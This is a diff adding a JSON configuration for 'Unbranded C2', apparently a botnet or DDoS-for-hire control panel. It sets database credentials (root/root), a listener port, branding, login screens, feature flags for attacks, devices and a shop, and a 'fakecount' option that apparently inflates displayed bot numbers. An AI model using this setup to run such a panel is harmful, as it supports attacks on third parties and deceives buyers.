@@ -1,0 +1,111 @@
+{
+    "key": "This Key no worky :(",
+    "mysql": {
+        "address": "127.0.0.1:3306",
+        "username": "root",
+        "password": "root",
+        "table": "unbranded"
+    },
+    "connection": {
+        "server version": "",
+        "port": 50123
+    },
+    "webhook": {
+        "enabled": false,
+        "url": ""
+    },
+    "fakecount": {
+        "enabled": false,
+        "spoof": false,
+        "port": 123,
+        "delay": 10,
+        "chance": 50,
+        "minimum": 1000,
+        "maximum": 1300
+    },
+    "branding": {
+        "title": "Unbranded C2 | User [<<$username>>] | Active Sessions <<$onlineusers>> | <<$expiry>> ",
+        "prompt": " ESC[48;2;255;0;0m ESC[1;37m<<$username>> ESC[1;37m● ESC[1;37mUnbrandedC2 ESC[48;5;0m ➤➤ ESC[1;37m",
+        "assets": {
+            "welcome": "home",
+            "banner": "home",
+            "attack": "attack"
+        },
+        "login": {
+            "custom": false,
+            "title": "Welcome to Unbranded C2",
+            "asset": "login",
+            "getuser": "<<include(user)>>",
+            "getpass": "<<include(pass)>>"
+        },
+        "tos": {
+            "enabled": false,
+            "title": "TOS",
+            "asset": "tos",
+            "prompt": "Unbranded c2 TOS ->",
+            "answer": "i agree"
+        },
+        "otp": {
+            "enabled": false,
+            "title": "Unbranded C2 Auth Waiting...",
+            "asset": "otp",
+            "prompt": "codehere-> "
+        },
+        "errors": {
+            "403": "<theme>403 You Do Not Have Access!</>",
+            "404": "<theme>404 Asset Not Found!</>",
+            "500": "<theme>500 Asset Error!</>"
+        },
+        "hardcoded": {
+            "attack": true,
+            "help": false,
+            "chat": true,
+            "methods": false,
+            "tools": true,
+            "devices": true,
+            "theme": true,
+            "key": true,
+            "shop": true
+        },
+        "captcha": {
+            "enabled": false,
+            "title": "",
+            "prompt": "",
+            "asset": ""
+        },
+        "misc": {
+            "lock host": false,
+            "lock timezone": true,
+            "chat cooldown": 5,
+            "idle timeout": 2600,
+            "prompt check": false,
+            "memory assets": false,
+            "spinner": [
+                "<   3",
+                "<-  3",
+                "< - 3",
+                "<  -3"
+            ],
+            "invert gradients": false,
+            "prompt colors": [
+                {
+                    "r": 255,
+                    "g": 255,
+                    "b": 255
+                }
+            ],
+            "gradient": [
+                {
+                    "r": 222,
+                    "g": 3,
+                    "b": 244
+                },
+                {
+                    "r": 0,
+                    "g": 46,
+                    "b": 250
+                }
+            ]
+        }
+    }
+}
